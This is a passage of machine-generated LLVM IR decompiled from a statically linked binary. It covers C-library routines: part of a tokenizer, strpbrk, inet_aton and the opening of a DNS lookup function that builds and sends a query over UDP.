  store i32 %v2_10010de8, i32* @r31, align 4
  store i32 %v2_10010de8, i32* @r3, align 4
  %v3_10010df4 = icmp eq i8 %v4_10010de8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10010df4, label %dec_label_pc_10010e00, label %dec_label_pc_10010e08

dec_label_pc_10010e00:                            ; preds = %dec_label_pc_10010ddc
  %v1_10010e00 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010e00 = inttoptr i32 %v1_10010e00 to i32*
  store i32 %v2_10010de8, i32* %v2_10010e00, align 4
  br label %dec_label_pc_10010e40

dec_label_pc_10010e08:                            ; preds = %dec_label_pc_10010ddc
  store i32 268504588, i32* @lr, align 4
  %v3_10010e08 = call i32 @__GI_strpbrk(i8* %v3_10010de8, i32 %v0_10010de4)
  %v4_10010e10 = icmp eq i32 %v3_10010e08, 0
  %v0_10010e14 = load i32, i32* @r31, align 4
  store i32 %v0_10010e14, i32* @r3, align 4
  %v2_10010e18 = add i32 %v3_10010e08, 1
  store i32 %v2_10010e18, i32* %r11.global-to-local, align 4
  br i1 %v4_10010e10, label %dec_label_pc_10010e20, label %dec_label_pc_10010e30

dec_label_pc_10010e20:                            ; preds = %dec_label_pc_10010e08
  store i32 268504612, i32* @lr, align 4
  %v4_10010e20 = call i32 @rawmemchr(i32 %v0_10010e14, i32 0, i32 0)
  %v0_10010e24 = load i32, i32* @r31, align 4
  store i32 %v0_10010e24, i32* %r0.global-to-local, align 4
  %v1_10010e28 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010e28 = inttoptr i32 %v1_10010e28 to i32*
  store i32 %v4_10010e20, i32* %v2_10010e28, align 4
  br label %dec_label_pc_10010e40

dec_label_pc_10010e30:                            ; preds = %dec_label_pc_10010e08
  %v1_10010e10 = inttoptr i32 %v3_10010e08 to i8*
  store i8 0, i8* %v1_10010e10, align 1
  %v0_10010e38 = load i32, i32* @r31, align 4
  store i32 %v0_10010e38, i32* %r0.global-to-local, align 4
  %v0_10010e3c = load i32, i32* %r11.global-to-local, align 4
  %v1_10010e3c = load i32, i32* %r30.global-to-local, align 4
  %v2_10010e3c = inttoptr i32 %v1_10010e3c to i32*
  store i32 %v0_10010e3c, i32* %v2_10010e3c, align 4
  br label %dec_label_pc_10010e40

dec_label_pc_10010e40:                            ; preds = %dec_label_pc_10010e20, %dec_label_pc_10010e00, %dec_label_pc_10010e30
  %v0_10010e40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10010dbc, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010e40

; uselistorder directives
  uselistorder i32 %v3_10010e08, { 2, 0, 1 }
  uselistorder i32 %v2_10010de8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10010ddc, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r30.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_10010e40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010ddc, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10010e781 = load i32, i32* @r3, align 4
  %v1_10010e782 = inttoptr i32 %v0_10010e781 to i8*
  %v2_10010e783 = load i8, i8* %v1_10010e782, align 1
  %v3_10010e784 = zext i8 %v2_10010e783 to i32
  store i32 %v3_10010e784, i32* %r11.global-to-local, align 4
  %v3_10010e7c6 = icmp eq i8 %v2_10010e783, 0
  br i1 %v3_10010e7c6, label %dec_label_pc_10010e8c, label %dec_label_pc_10010e84

dec_label_pc_10010e5c:                            ; preds = %dec_label_pc_10010e60
  %v3_10010e60 = zext i8 %v2_10010e60 to i32
  %v4_10010e6c = icmp eq i32 %v3_10010e60, %v1_10010e6c
  %v0_10010e5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010e6c, i32 %v0_10010e5c)
  %v0_10010e60.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10010e6c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010e60

dec_label_pc_10010e60:                            ; preds = %dec_label_pc_10010e84, %dec_label_pc_10010e5c
  %v1_10010e6c = phi i32 [ %v1_10010e6c9, %dec_label_pc_10010e84 ], [ %v1_10010e6c.pre, %dec_label_pc_10010e5c ]
  %v0_10010e60 = phi i32 [ %tmp, %dec_label_pc_10010e84 ], [ %v0_10010e60.pre, %dec_label_pc_10010e5c ]
  %v1_10010e60 = inttoptr i32 %v0_10010e60 to i8*
  %v2_10010e60 = load i8, i8* %v1_10010e60, align 1
  %v1_10010e64 = add i32 %v0_10010e60, 1
  store i32 %v1_10010e64, i32* %r9.global-to-local, align 4
  %v3_10010e68 = icmp eq i8 %v2_10010e60, 0
  br i1 %v3_10010e68, label %dec_label_pc_10010e74, label %dec_label_pc_10010e5c

dec_label_pc_10010e74:                            ; preds = %dec_label_pc_10010e60
  %v0_10010e74 = load i32, i32* @r3, align 4
  %v1_10010e74 = add i32 %v0_10010e74, 1
  store i32 %v1_10010e74, i32* @r3, align 4
  %v1_10010e78 = inttoptr i32 %v1_10010e74 to i8*
  %v2_10010e78 = load i8, i8* %v1_10010e78, align 1
  %v3_10010e78 = zext i8 %v2_10010e78 to i32
  store i32 %v3_10010e78, i32* %r11.global-to-local, align 4
  %v3_10010e7c = icmp eq i8 %v2_10010e78, 0
  br i1 %v3_10010e7c, label %dec_label_pc_10010e8c, label %dec_label_pc_10010e84

dec_label_pc_10010e84:                            ; preds = %entry, %dec_label_pc_10010e74
  %v1_10010e6c9 = phi i32 [ %v3_10010e78, %dec_label_pc_10010e74 ], [ %v3_10010e784, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010e60

dec_label_pc_10010e8c:                            ; preds = %dec_label_pc_10010e74, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10010e60, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010e84, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10010e94 = icmp eq i8* %arg1, null
  br i1 %v3_10010e94, label %dec_label_pc_10010f4c, label %dec_label_pc_10010e9c

dec_label_pc_10010e9c:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10010eb0.pre = load i32, i32* @global_var_1002e5b0, align 4
  br label %dec_label_pc_10010eac

dec_label_pc_10010eac:                            ; preds = %dec_label_pc_10010e9c, %dec_label_pc_10010f24
  %v0_10010f24 = phi i32 [ 0, %dec_label_pc_10010e9c ], [ %v2_10010f2c, %dec_label_pc_10010f24 ]
  %v0_10010f28 = phi i32 [ 1, %dec_label_pc_10010e9c ], [ %v1_10010f28, %dec_label_pc_10010f24 ]
  %v0_10010eac = phi i32 [ %tmp, %dec_label_pc_10010e9c ], [ %v0_10010eac3, %dec_label_pc_10010f24 ]
  %v1_10010eac = inttoptr i32 %v0_10010eac to i8*
  %v2_10010eac = load i8, i8* %v1_10010eac, align 1
  %v3_10010eac = zext i8 %v2_10010eac to i32
  %v1_10010eb4 = mul nuw nsw i32 %v3_10010eac, 2
  %v2_10010eb8 = add i32 %v1_10010eb4, %v3_10010eb0.pre
  %v3_10010eb8 = inttoptr i32 %v2_10010eb8 to i16*
  %v4_10010eb8 = load i16, i16* %v3_10010eb8, align 2
  %v1_10010ebc = and i16 %v4_10010eb8, 8
  %v3_10010ebc = icmp eq i16 %v1_10010ebc, 0
  br i1 %v3_10010ebc, label %dec_label_pc_10010f4c, label %dec_label_pc_10010ec4

dec_label_pc_10010ec4:                            ; preds = %dec_label_pc_10010eac
  br label %dec_label_pc_10010edc

dec_label_pc_10010ecc:                            ; preds = %dec_label_pc_10010edc
  %v1_10010ee0 = mul i32 %v1_10010f2c, 10
  %v2_10010ee8 = add i32 %v3_10010edc, %v1_10010ee0
  %v1_10010ecc = add i32 %v2_10010ee8, -48
  %v1_10010ed0 = add i32 %v0_10010f14, 1
  %v2_10010ed4 = icmp sgt i32 %v1_10010ecc, 255
  br i1 %v2_10010ed4, label %dec_label_pc_10010f4c, label %dec_label_pc_10010edc

dec_label_pc_10010edc:                            ; preds = %dec_label_pc_10010ecc, %dec_label_pc_10010ec4
  %v1_10010f2c = phi i32 [ %v1_10010ecc, %dec_label_pc_10010ecc ], [ 0, %dec_label_pc_10010ec4 ]
  %v0_10010f14 = phi i32 [ %v1_10010ed0, %dec_label_pc_10010ecc ], [ %v0_10010eac, %dec_label_pc_10010ec4 ]
  %v1_10010edc = inttoptr i32 %v0_10010f14 to i8*
  %v2_10010edc = load i8, i8* %v1_10010edc, align 1
  %v3_10010edc = zext i8 %v2_10010edc to i32
  %v1_10010ee4 = mul nuw nsw i32 %v3_10010edc, 2
  %v2_10010eec = add i32 %v1_10010ee4, %v3_10010eb0.pre
  %v3_10010eec = inttoptr i32 %v2_10010eec to i16*
  %v4_10010eec = load i16, i16* %v3_10010eec, align 2
  %v5_10010eec = zext i16 %v4_10010eec to i32
  %v1_10010ef0 = and i32 %v5_10010eec, 8
  %v3_10010ef0 = icmp eq i32 %v1_10010ef0, 0
  br i1 %v3_10010ef0, label %dec_label_pc_10010ef8, label %dec_label_pc_10010ecc

dec_label_pc_10010ef8:                            ; preds = %dec_label_pc_10010edc
  %v2_10010ef8 = icmp sgt i32 %v0_10010f28, 3
  br i1 %v2_10010ef8, label %dec_label_pc_10010f10, label %dec_label_pc_10010f00

dec_label_pc_10010f00:                            ; preds = %dec_label_pc_10010ef8
  %v3_10010f00 = icmp eq i8 %v2_10010edc, 46
  br i1 %v3_10010f00, label %dec_label_pc_10010f08, label %dec_label_pc_10010f4c

dec_label_pc_10010f08:                            ; preds = %dec_label_pc_10010f00
  %v1_10010f08 = add i32 %v0_10010f14, 1
  br label %dec_label_pc_10010f24

dec_label_pc_10010f10:                            ; preds = %dec_label_pc_10010ef8
  %v3_10010f10 = icmp eq i8 %v2_10010edc, 0
  %v1_10010f14 = add i32 %v0_10010f14, 1
  br i1 %v3_10010f10, label %dec_label_pc_10010f24, label %dec_label_pc_10010f1c

dec_label_pc_10010f1c:                            ; preds = %dec_label_pc_10010f10
  %v1_10010f1c = and i32 %v5_10010eec, 32
  %v3_10010f1c = icmp eq i32 %v1_10010f1c, 0
  br i1 %v3_10010f1c, label %dec_label_pc_10010f4c, label %dec_label_pc_10010f24

dec_label_pc_10010f24:                            ; preds = %dec_label_pc_10010f1c, %dec_label_pc_10010f10, %dec_label_pc_10010f08
  %v0_10010eac3 = phi i32 [ %v1_10010f14, %dec_label_pc_10010f1c ], [ %v1_10010f14, %dec_label_pc_10010f10 ], [ %v1_10010f08, %dec_label_pc_10010f08 ]
  %v1_10010f24 = mul i32 %v0_10010f24, 256
  %v1_10010f28 = add nuw nsw i32 %v0_10010f28, 1
  %v2_10010f2c = or i32 %v1_10010f2c, %v1_10010f24
  store i32 %v2_10010f2c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10010f28, 5
  br i1 %tmp10, label %dec_label_pc_10010eac, label %dec_label_pc_10010f38

dec_label_pc_10010f38:                            ; preds = %dec_label_pc_10010f24
  %v0_10010f38 = load i32, i32* @r4, align 4
  %v3_10010f38 = icmp eq i32 %v0_10010f38, 0
  %v0_10010f40 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10010f38, i32 %v0_10010f40)
  %v0_10010f44 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010f44 = load i32, i32* @r4, align 4
  %v2_10010f44 = inttoptr i32 %v1_10010f44 to i32*
  store i32 %v0_10010f44, i32* %v2_10010f44, align 4
  ret i32 1

dec_label_pc_10010f4c:                            ; preds = %dec_label_pc_10010f00, %dec_label_pc_10010f1c, %dec_label_pc_10010eac, %dec_label_pc_10010ecc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10010f2c, { 1, 0 }
  uselistorder i32 %v1_10010f28, { 1, 0 }
  uselistorder i32 %v0_10010f14, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10010f4c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10010eac, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10010f58 = load i32, i32* @lr, align 4
  store i32 %v0_10010f58, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268504964, i32* @lr, align 4
  %v0_10010f80 = call i32 @malloc()
  store i32 %v0_10010f80, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268504976, i32* @lr, align 4
  %v0_10010f8c = call i32 @malloc()
  %v0_10010f90 = load i32, i32* @r30, align 4
  %v3_10010f90 = icmp eq i32 %v0_10010f90, 0
  store i32 %v0_10010f8c, i32* @r21, align 4
  br i1 %v3_10010f90, label %dec_label_pc_1001154c, label %dec_label_pc_10010f9c

dec_label_pc_10010f9c:                            ; preds = %entry
  %v3_10010f9c = icmp eq i32 %v0_10010f8c, 0
  br i1 %v3_10010f9c, label %dec_label_pc_1001154c, label %dec_label_pc_10010fa4

dec_label_pc_10010fa4:                            ; preds = %dec_label_pc_10010f9c
  %v0_10010fa4 = load i32, i32* @r23, align 4
  %v3_10010fa4 = icmp eq i32 %v0_10010fa4, 0
  br i1 %v3_10010fa4, label %dec_label_pc_1001154c, label %dec_label_pc_10010fac

dec_label_pc_10010fac:                            ; preds = %dec_label_pc_10010fa4
  %v0_10010fac = load i32, i32* %r14.global-to-local, align 4
  %v1_10010fac = inttoptr i32 %v0_10010fac to i8*
  %v2_10010fac = load i8, i8* %v1_10010fac, align 1
  %v3_10010fac = zext i8 %v2_10010fac to i32
  store i32 %v3_10010fac, i32* %r0.global-to-local, align 4
  %v3_10010fb0 = icmp eq i8 %v2_10010fac, 0
  br i1 %v3_10010fb0, label %dec_label_pc_1001154c, label %dec_label_pc_10010fb8

dec_label_pc_10010fb8:                            ; preds = %dec_label_pc_10010fac
  store i32 %v0_10010fac, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  %v0_10010fc0 = call i32 @__GI_strlen()
  %v0_10010fc8 = load i32, i32* %r14.global-to-local, align 4
  %v2_10010fc8 = add i32 %v0_10010fc8, %v0_10010fc0
  %v1_10010fd0 = add i32 %v2_10010fc8, -1
  %v2_10010fd0 = inttoptr i32 %v1_10010fd0 to i8*
  %v3_10010fd0 = load i8, i8* %v2_10010fd0, align 1
  %v4_10010fd0 = zext i8 %v3_10010fd0 to i32
  store i32 %v4_10010fd0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10034890.920 to i32), i32* %r29.global-to-local, align 4
  %v2_10010fd8 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10010fd8, i32* %r28.global-to-local, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v1_10010fe4 = xor i32 %v4_10010fd0, 46
  store i32 %v1_10010fe4, i32* %r17.global-to-local, align 4
  %v0_10010fe8 = call i32 @__pthread_return_void()
  %v0_10010ff0 = call i32 @__pthread_return_0()
  %v3_10010ff8 = load i32, i32* @global_var_1002e650.921, align 4
  store i32 %v3_10010ff8, i32* %r11.global-to-local, align 4
  %v3_10011004 = load i16, i16* @global_var_1002e56c.922, align 2
  %v4_10011004 = zext i16 %v3_10011004 to i32
  store i32 %v4_10011004, i32* @r25, align 4
  %v1_10011008 = load i32, i32* @r23, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10011008 = srem i32 %v3_10010ff8, %v1_10011008
  %v2_10011024 = sub i32 %v3_10010ff8, %v2_10011008
  store i32 %v2_10011024, i32* %r0.global-to-local, align 4
  store i32 %v2_10011008, i32* @r26, align 4
  %v0_1001102c = call i32 @__pthread_return_void()
  %v0_10011540.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10011540.pr19, 3
  br i1 %tmp57, label %dec_label_pc_10011034.lr.ph.lr.ph, label %dec_label_pc_10011558

dec_label_pc_10011034.lr.ph.lr.ph:                ; preds = %dec_label_pc_10010fb8
  %v2_1001104c = ptrtoint i32* %stack_var_-144 to i32
  %v2_10011160 = ptrtoint i32* %stack_var_-204 to i32
  %v2_100111c0 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10011204 = ptrtoint i32* %stack_var_-248 to i32
  %v3_10011260 = icmp eq i32 %tmp37, 0
  %v3_1001126c = icmp eq i32 %tmp36, 3
  %v2_100112e8 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1001133c = ptrtoint i32* %stack_var_-184 to i32
  %v3_10011368 = icmp eq i32 %tmp33, 0
  %v3_100112dc = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_10011034.lr.ph

dec_label_pc_10011034:                            ; preds = %dec_label_pc_10011034.lr.ph, %dec_label_pc_100111e4
  %v0_10011034 = load i32, i32* @r19, align 4
  %v3_10011034 = icmp eq i32 %v0_10011034, -1
  br i1 %v3_10011034, label %dec_label_pc_10011044, label %dec_label_pc_1001103c

dec_label_pc_1001103c:                            ; preds = %dec_label_pc_10011034
  store i32 268505156, i32* @lr, align 4
  %v1_10011040 = call i32 @__libc_close(i32 %v0_10011034)
  br label %dec_label_pc_10011044

dec_label_pc_10011044:                            ; preds = %dec_label_pc_10011034, %dec_label_pc_1001103c
  store i32 %v2_1001104c, i32* %r29.global-to-local, align 4
  %v0_10011050 = load i32, i32* @r30, align 4
  store i32 268505176, i32* @lr, align 4
  %v3_10011054 = call i32 @__GI_memset(i32 %v0_10011050, i32 0, i32 512)
  store i32 268505192, i32* @lr, align 4
  %v3_10011064 = call i32 @__GI_memset(i32 %v2_1001104c, i32 0, i32 48)
  %v0_10011068 = load i32, i32* @r25, align 4
  %v1_10011068 = add i32 %v0_10011068, 1
  %v1_1001106c = urem i32 %v1_10011068, 65536
  store i32 %v1_1001106c, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011078 = load i32, i32* @r30, align 4
  store i32 %v1_1001106c, i32* %stack_var_-144, align 4
  %v4_1001108c = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10011078, i32 512)
  store i32 %v4_1001108c, i32* %r28.global-to-local, align 4
  %v1_10011090 = icmp slt i32 %v4_1001108c, 0
  br i1 %v1_10011090, label %dec_label_pc_10011558, label %dec_label_pc_10011098

dec_label_pc_10011098:                            ; preds = %dec_label_pc_10011044
  %v0_10011098 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10011098, i32* @r4, align 4
  %v0_100110a0 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268505260, i32* @lr, align 4
  %v4_100110a8 = call i32 @strncpy(i32 %v0_100110a0, i32 %v0_10011098, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002e570.869 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v0_100110c0 = call i32 @__pthread_return_void()
  %v0_100110c8 = call i32 @__pthread_return_0()
  %v0_100110cc = load i32, i32* @r22, align 4
  %v1_100110cc = icmp slt i32 %v0_100110cc, 0
  %v0_100110d4 = load i32, i32* @r26, align 4
  %v1_100110d4 = mul i32 %v0_100110d4, 4
  store i32 %v1_100110d4, i32* %r0.global-to-local, align 4
  %v2_100110d8 = add i32 %v1_100110d4, %arg4
  %v3_100110d8 = inttoptr i32 %v2_100110d8 to i32*
  %v4_100110d8 = load i32, i32* %v3_100110d8, align 4
  store i32 %v4_100110d8, i32* %r29.global-to-local, align 4
  br i1 %v1_100110cc, label %dec_label_pc_10011120, label %dec_label_pc_100110e0

dec_label_pc_100110e0:                            ; preds = %dec_label_pc_10011098
  %v3_100110e4 = load i32, i32* @global_var_1002e658.924, align 4
  store i32 %v3_100110e4, i32* %r0.global-to-local, align 4
  %v2_100110e8 = icmp slt i32 %v0_100110cc, %v3_100110e4
  br i1 %v2_100110e8, label %dec_label_pc_100110f0, label %dec_label_pc_10011120

dec_label_pc_100110f0:                            ; preds = %dec_label_pc_100110e0
  store i32 ptrtoint (i32* @global_var_1001d860.925 to i32), i32* @r4, align 4
  %v0_100110fc = load i32, i32* @r21, align 4
  store i32 268505348, i32* @lr, align 4
  %v4_10011100 = inttoptr i32 %v0_100110fc to i8*
  %v5_10011100 = call i32 @__GI_strncat(i8* %v4_10011100, i32 ptrtoint (i32* @global_var_1001d860.925 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10011108 = load i32, i32* @r22, align 4
  %v1_10011108 = mul i32 %v0_10011108, 4
  store i32 %v1_10011108, i32* %r0.global-to-local, align 4
  %v2_10011110 = add i32 %v1_10011108, ptrtoint (i32* @global_var_10034940.926 to i32)
  %v3_10011110 = inttoptr i32 %v2_10011110 to i32*
  %v4_10011110 = load i32, i32* %v3_10011110, align 4
  store i32 %v4_10011110, i32* @r4, align 4
  %v0_10011114 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011120.927 to i32), i32* @lr, align 4
  %v4_1001111c = inttoptr i32 %v0_10011114 to i8*
  %v5_1001111c = call i32 @__GI_strncat(i8* %v4_1001111c, i32 %v4_10011110, i32 1025, i32 ptrtoint (i32* @global_var_10034940.926 to i32))
  br label %dec_label_pc_10011120

dec_label_pc_10011120:                            ; preds = %dec_label_pc_100110e0, %dec_label_pc_10011098, %dec_label_pc_100110f0
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v0_10011128 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011134 = load i32, i32* @r30, align 4
  %v1_10011134 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011134 = add i32 %v1_10011134, %v0_10011134
  %v1_10011138 = sub i32 512, %v1_10011134
  %v0_10011140 = load i32, i32* @r21, align 4
  store i32 %v0_10011140, i32* %stack_var_-240, align 4
  store i32 268505420, i32* @lr, align 4
  %v4_10011148 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10011134, i32 %v1_10011138)
  store i32 %v4_10011148, i32* @r27, align 4
  %v1_1001114c = icmp slt i32 %v4_10011148, 0
  br i1 %v1_1001114c, label %dec_label_pc_10011558, label %dec_label_pc_10011154

dec_label_pc_10011154:                            ; preds = %dec_label_pc_10011120
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001115c = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268505452, i32* @lr, align 4
  %v3_10011168 = inttoptr i32 %v0_1001115c to i8*
  %v4_10011168 = call i32 @inet_pton(i32 10, i8* %v3_10011168, i32 %v2_10011160)
  %tmp59 = icmp slt i32 %v4_10011168, 1
  br i1 %tmp59, label %dec_label_pc_1001117cthread-pre-split, label %dec_label_pc_10011174

dec_label_pc_10011174:                            ; preds = %dec_label_pc_10011154
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1001117c

dec_label_pc_1001117cthread-pre-split:            ; preds = %dec_label_pc_10011154
  %v3_1001117c.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1001117c

dec_label_pc_1001117c:                            ; preds = %dec_label_pc_1001117cthread-pre-split, %dec_label_pc_10011174
  %v3_1001117c = phi i16 [ %v3_1001117c.pr, %dec_label_pc_1001117cthread-pre-split ], [ 10, %dec_label_pc_10011174 ]
  %v3_10011180 = icmp eq i16 %v3_1001117c, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10011180, label %dec_label_pc_100111a8, label %dec_label_pc_10011194

dec_label_pc_10011194:                            ; preds = %dec_label_pc_1001117c
  %v0_10011198 = load i32, i32* @r29, align 4
  store i32 268505508, i32* @lr, align 4
  %v1_100111a0 = call i32 @inet_addr(i32 %v0_10011198)
  %v3_100111a8.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100111a8

dec_label_pc_100111a8:                            ; preds = %dec_label_pc_1001117c, %dec_label_pc_10011194
  %v3_100111a8 = phi i16 [ 10, %dec_label_pc_1001117c ], [ %v3_100111a8.pre, %dec_label_pc_10011194 ]
  %v4_100111a8 = sext i16 %v3_100111a8 to i32
  store i32 268505528, i32* @lr, align 4
  %v3_100111b4 = call i32 @socket(i32 %v4_100111a8, i32 2, i32 17)
  store i32 %v3_100111b4, i32* @r19, align 4
  %v1_100111b8 = icmp slt i32 %v3_100111b4, 0
  br i1 %v1_100111b8, label %dec_label_pc_100111e4, label %dec_label_pc_100111c0

dec_label_pc_100111c0:                            ; preds = %dec_label_pc_100111a8
  store i32 268505548, i32* @lr, align 4
  %v3_100111c8 = call i32 @__libc_connect(i32 %v2_100111c0, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_100111c8, -1
  br i1 %tmp60, label %dec_label_pc_100111ec, label %dec_label_pc_100111d4

dec_label_pc_100111d4:                            ; preds = %dec_label_pc_100111c0
  %v0_100111d4 = call i32 @__errno_location()
  %v1_100111d8 = inttoptr i32 %v0_100111d4 to i32*
  %v2_100111d8 = load i32, i32* %v1_100111d8, align 4
  store i32 %v2_100111d8, i32* %r0.global-to-local, align 4
  %v3_100111dc = icmp eq i32 %v2_100111d8, 101
  br i1 %v3_100111dc, label %dec_label_pc_10011524, label %dec_label_pc_100111e4

dec_label_pc_100111e4:                            ; preds = %dec_label_pc_100111d4, %dec_label_pc_100111a8
  %v0_100111e4 = load i32, i32* %r18.global-to-local, align 4
  %v1_100111e4 = add i32 %v0_100111e4, 1
  store i32 %v1_100111e4, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_100111e4, 3
  br i1 %tmp61, label %dec_label_pc_10011034, label %dec_label_pc_10011558

dec_label_pc_100111ec:                            ; preds = %dec_label_pc_100111c0
  %v0_100111ec = load i32, i32* @r28, align 4
  %v1_100111ec = load i32, i32* @r27, align 4
  %v2_100111ec = add i32 %v1_100111ec, %v0_100111ec
  %v0_100111f0 = load i32, i32* @r30, align 4
  %v0_100111f8 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10011200.929 to i32), i32* @lr, align 4
  %v4_100111fc = call i32 @__libc_send(i32 %v0_100111f8, i32 %v0_100111f0, i32 %v2_100111ec, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011214 = load i32, i32* @r19, align 4
  store i32 %v0_10011214, i32* %stack_var_-248, align 4
  store i32 268505628, i32* @lr, align 4
  %v3_10011218 = call i32 @__libc_poll(i32 %v2_10011204, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10011218, 1
  br i1 %tmp62, label %dec_label_pc_10011524, label %dec_label_pc_10011224

dec_label_pc_10011224:                            ; preds = %dec_label_pc_100111ec
  %v0_10011224 = load i32, i32* @r19, align 4
  %v0_10011228 = load i32, i32* @r30, align 4
  store i32 268505656, i32* @lr, align 4
  %v4_10011234 = call i32 @__libc_recv(i32 %v0_10011224, i32 %v0_10011228, i32 512, i32 0)
  store i32 %v4_10011234, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10011234, 12
  br i1 %tmp63, label %dec_label_pc_100114cc, label %dec_label_pc_10011244

dec_label_pc_10011244:                            ; preds = %dec_label_pc_10011224
  %v0_10011244 = load i32, i32* @r30, align 4
  %v2_1001124c = inttoptr i32 %v0_10011244 to i8*
  %v3_1001124c = call i32 @__decode_header(i8* %v2_1001124c, i32 %v2_1001104c)
  %v3_10011250 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10011250, i32* @r20, align 4
  %v1_10011254 = load i32, i32* @r25, align 4
  %v4_10011254 = icmp eq i32 %v3_10011250, %v1_10011254
